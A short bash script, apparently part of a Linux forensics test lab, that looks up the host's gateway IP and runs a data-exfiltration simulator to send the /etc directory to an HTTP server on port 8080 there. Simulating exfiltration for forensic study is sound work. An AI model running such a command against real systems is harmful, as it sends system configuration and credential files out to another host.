#!/bin/bash
HOST_IP=$(ip route | grep default | awk '{print $3}')
echo "Host IP is $HOST_IP"
python3 /mnt/d/C/Git/Linux-Forensics-system/testlab/data_exfil_simulator.py /etc http://$HOST_IP:8080
